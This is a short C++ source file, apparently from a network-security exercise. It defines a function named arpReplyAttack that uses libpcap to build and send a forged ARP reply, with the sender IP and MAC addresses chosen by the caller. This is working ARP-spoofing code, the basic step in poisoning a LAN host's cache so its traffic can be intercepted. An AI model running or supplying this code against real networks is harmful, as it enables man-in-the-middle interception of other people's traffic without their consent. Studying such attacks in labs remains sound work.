#include "pch.h"
\
#pragma pack(push, 1)
    struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void arpReplyAttack(pcap_t *pcap, char *src_ip, char *dst_ip, char *src_mac, char *dst_mac)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(dst_mac);
    packet.eth_.smac_ = Mac(src_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(src_mac);
    packet.arp_.sip_ = htonl(Ip(src_ip));
    packet.arp_.tmac_ = Mac(dst_mac);
    packet.arp_.tip_ = htonl(Ip(dst_ip));

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        exit(1);
    }
}
